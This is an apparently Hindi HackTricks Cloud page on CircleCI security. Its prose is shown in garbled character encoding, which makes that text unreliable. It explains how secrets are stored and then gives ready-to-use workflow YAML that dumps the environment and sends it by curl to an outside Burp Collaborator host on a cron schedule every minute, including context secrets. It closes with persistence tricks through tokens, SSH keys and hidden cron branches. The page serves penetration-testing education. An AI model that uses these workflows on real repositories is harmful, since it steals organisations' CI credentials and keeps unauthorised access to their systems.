# CircleCI рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) рдПрдХ рд╕рддрдд рдПрдХреАрдХрд░рдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк рдХреЛрдб рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рдХрдм рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд░реЗрдкреЛ рдорд╛рд╕реНрдЯрд░ рдмреНрд░рд╛рдВрдЪ рд╕реЗ **рдЯреЗрд╕реНрдЯрд┐рдВрдЧ** рдпрд╛ **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ** рдХреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рдЕрдиреБрдорддрд┐рдпрд╛рдБ

**CircleCI** рдЧрд┐рдЯрд╣рдм рдФрд░ рдмрд┐рдЯрдмрдХреЗрдЯ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд **рдЦрд╛рддреЗ** рдХреА **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡рд╛рд░рд┐рд╕реНрдд рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИред\
рдореЗрд░реЗ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдореИрдВрдиреЗ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдХрд┐ рдЬрдм рддрдХ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЧрд┐рдЯрд╣рдм рдореЗрдВ рд░реЗрдкреЛ рдкрд░ **рд▓реЗрдЦрди рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рдЖрдкрдХреЛ **CircleCI рдореЗрдВ рдЗрд╕рдХреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрдЧреА (рдирдП ssh рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╕реЗрдЯ рдХрд░реЗрдВ, рдкрд░рд┐рдпреЛрдЬрдирд╛ api рдХреБрдВрдЬрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ, рдирдП CircleCI рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЗ рд╕рд╛рде рдирдП рдмреНрд░рд╛рдВрдЪ рдмрдирд╛рдПрдВ... )ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдПрдХ **рд░реЗрдкреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдЖрдк рд░реЗрдкреЛ рдХреЛ **CircleCI рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рд░реВрдкрд╛рдВрддрд░рд┐рдд** рдХрд░ рд╕рдХреЗрдВред

## Env Variables & Secrets

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг**](https://circleci.com/docs/2.0/env-vars/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ **рдкрд░реНрдпрд╛рдкреНрдд рдорд╛рдиреЛрдВ рдХреЛ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

### рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд env variables

CircleCI рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЧрдП рд╣рд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣рдореЗрд╢рд╛ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╡рд┐рд╢реЗрд╖ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) рд╣реЛрдВрдЧреЗ рдЬреИрд╕реЗ `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` рдпрд╛ `CIRCLE_USERNAME`ред

### рд╕рд╛рдл рдЯреЗрдХреНрд╕реНрдЯ

рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕рд╛рдл рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рдПрдХ **рдХрдорд╛рдВрдб** рдХреЗ рднреАрддрд░ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрд░реНрдпрд╛рд╡рд░рдг** рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **build-job environment** рдХреЗ рднреАрддрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ** рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд░рд╣рд╕реНрдп

рдпреЗ рд╣реИрдВ рд╡рд╣ **рд░рд╣рд╕реНрдп** рдЬреЛ рдХреЗрд╡рд▓ **рдкрд░рд┐рдпреЛрдЬрдирд╛** (рдХрд┐рд╕реА рднреА рд╢рд╛рдЦрд╛ рджреНрд╡рд╛рд░рд╛) рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп** рд╣реЛрдВрдЧреЗред\
рдЖрдк рдЗрдиреНрд╣реЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ **рдШреЛрд╖рд┐рдд рдХрд┐рдП рдЧрдП** рдореЗрдВ _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**рдЖрдпрд╛рдд рдЪрд░**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рджреВрд╕рд░реЗ рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рдЪрд░реЛрдВ рдХреЛ рдЗрд╕рдореЗрдВ **рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред
{% endhint %}

### рд╕рдВрджрд░реНрдн рд░рд╣рд╕реНрдп

рдпреЗ рд╣реИрдВ рд░рд╣рд╕реНрдп рдЬреЛ **рд╕рдВрдЧрдарди рд╡реНрдпрд╛рдкреА** рд╣реЛрддреЗ рд╣реИрдВред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЛрдИ рднреА рд░реЗрдкреЛ** рдЗрд╕рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЧрдП рдХрд┐рд╕реА рднреА рд░рд╣рд╕реНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ рдЕрд▓рдЧ рд╕рдореВрд╣ (рд╕рднреА рд╕рджрд╕реНрдпреЛрдВ рдХреЗ рдмрдЬрд╛рдп) рдХреЛ **рдЪрдпрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд░рд╣рд╕реНрдпреЛрдВ рдХрд╛ рдХреЗрд╡рд▓ рдХреБрдЫ рд▓реЛрдЧреЛрдВ рдХреЛ рд╣реА рдкрд╣реБрдВрдЪ рд╣реЛ**ред\
рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ, рдЗрд╕рд╕реЗ рд╕рднреА рдХреЛ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдмрд▓реНрдХрд┐ рдХреБрдЫ рд▓реЛрдЧреЛрдВ рдХреЛ рд╣реА рд╣реЛрддреА рд╣реИред
{% endhint %}

## рд╣рдорд▓реЗ

### рд╕рд╛рдл рдкрд╛рда рд░рд╣рд╕реНрдп рдЦреЛрдЬреЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реАрд╕реАрдПрд╕** (рдЬреИрд╕реЗ github) рдХрд╛ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреА рдкреНрд░рддреНрдпреЗрдХ рд╢рд╛рдЦрд╛ рдХреЗ `.circleci/config.yml` рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╡рд╣рд╛рдВ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рд╛рдл рдкрд╛рда рд░рд╣рд╕реНрдп рдХреА **рдЦреЛрдЬ** рдХрд░реЗрдВред

### рд░рд╣рд╕реНрдп рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡рд╛рд░реНрд╕ рдФрд░ рд╕рдВрджрд░реНрдн рдЧрдгрдирд╛

рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ `.circleci/config.yml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣реЗ **рд╕рднреА рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рдирд╛рдо** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ рдпрд╛ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ

{% hint style="warning" %}
рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдФрд░ рд╕рдВрджрд░реНрдн **рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреЗрд╡рд▓ 1 рд░реЗрдкреЛ** рдореЗрдВ **рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЧрд┐рдЯрд╣рдм рд╕рдВрдЧрдарди рдореЗрдВ (_рдФрд░ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЛ рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣рд░ рдХреЛрдИ рд╣рд░ рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ_)ред
{% endhint %}

{% hint style="danger" %}
"**рдЖрдпрд╛рдд рдЪрд░**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рджреВрд╕рд░реЗ рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рдЪрд░реЛрдВ рдХреЛ рдЗрд╕рдореЗрдВ **рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЪрд░реЛрдВ рдХреЛ рд╕рднреА рд░реЗрдкреЛ рд╕реЗ **рдЖрдпрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдлрд┐рд░ **рдЙрдиреНрд╣реЗрдВ рд╕рднреА рд╕рд╛рде рдореЗрдВ рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ**ред
{% endhint %}

рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдп рд╣рдореЗрд╢рд╛ рдЬреЙрдмреНрд╕ рдХреЗ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рдХреЛ рдмреБрд▓рд╛рдирд╛ рдФрд░ рдЗрд╕реЗ base64 рдореЗрдВ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдирд╛ рдХрд╛рдлреА рд╣реИ, рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╡реЗрдм рд▓реЙрдЧ рдХрдВрд╕реЛрд▓ рдореЗрдВ рдирд┐рдХрд╛рд▓реЗрдЧрд╛**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
рдпрджрд┐ рдЖрдкрдХреЛ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ** рдФрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдПрдХ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рд╣рд░ рдорд┐рдирдЯ **рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдкрддреЗ рдкрд░ **рдПрдХреНрд╕рдлрд┐рд▓реНрд╕ рдХрд░рддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### рд╕рдВрджрд░реНрдн рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ

рдЖрдкрдХреЛ **рд╕рдВрджрд░реНрдн рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** (рдпрд╣ рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдЧрд╛):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
рдпрджрд┐ рдЖрдкрдХреЛ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ** рдФрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдПрдХ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рдкреНрд░рддрд┐ рдорд┐рдирдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдкрддреЗ рдкрд░ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
рдПрдХ рдирдпрд╛ `.circleci/config.yml` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдирд╛ рдПрдХ рд░реЗрдкреЛ рдореЗрдВ **рдХреЗрд╡рд▓ рдПрдХ рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдмрд┐рд▓реНрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ**ред рдЖрдкрдХреЛ **рд╕рд░реНрдХрд▓рд╕реАрдЖрдИ рдХрдВрд╕реЛрд▓ рдореЗрдВ рдПрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред
{% endhint %}

### рдмрд╛рджрд▓ рдореЗрдВ рдЫрд┐рдкрдирд╛

**CircleCI** рдЖрдкрдХреЛ рдЙрдирдХреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЕрдкрдиреЗ рдмрд┐рд▓реНрдб рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИ рдпрд╛ рдлрд┐рд░ рдЕрдкрдиреА рдорд╢реАрдиреЛрдВ рдореЗрдВред\
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЙрдирдХреА рдорд╢реАрдиреЗрдВ GCP рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рдЖрдк рдкрд╣рд▓реЗ рд╢реБрд░реВ рдореЗрдВ рдХреЛрдИ рднреА рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рдвреВрдВрдв рдкрд╛рдПрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдИ рдкреАрдбрд╝рд┐рдд рдЕрдкрдиреА рдХрд╛рд░реНрдпреЛрдВ рдХреЛ **рдЕрдкрдиреА рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ (рд╕рдВрднрд╛рд╡рддрдГ, рдПрдХ рдмрд╛рджрд▓ рдПрдирд╡реА рдореЗрдВ)**, рддреЛ рдЖрдкрдХреЛ рдПрдХ **рдмрд╛рджрд▓ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╕рдм рдХреБрдЫ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЖрдк рдПрдХ рд╡реАрдПрдо рдорд╢реАрди рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА **рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬрд┐рд╕рдореЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдмрд╛рджрд▓ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
рдпрд╛ рдлрд┐рд░ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рджреВрд░рд╕реНрде рдбреЙрдХрд░ рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistence

* CircleCI рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЛрдХрди рдмрдирд╛рдирд╛ рд╕рдВрднрд╡** рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API endpoints рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
* _https://app.circleci.com/settings/user/tokens_
* рдкрд░рд┐рдпреЛрдЬрдирд╛ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЯреЛрдХрди рдмрдирд╛рдирд╛ рд╕рдВрднрд╡** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЯреЛрдХрди рдХреЛ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдореЗрдВ **SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡** рд╣реИред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* рдПрдХ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ **рдЫрд┐рдкреА рд╣реБрдИ рд╢рд╛рдЦрд╛ рдореЗрдВ cron рдЬреЙрдм рдмрдирд╛рдирд╛ рд╕рдВрднрд╡** рд╣реИ рдЬреЛ рд╣рд░ рджрд┐рди рд╕рднреА **рд╕рдВрджрд░реНрдн env** рд╡реЗрд░реНрд╕ рд▓реАрдХ рдХрд░ рд░рд╣реА рд╣реИрдВред
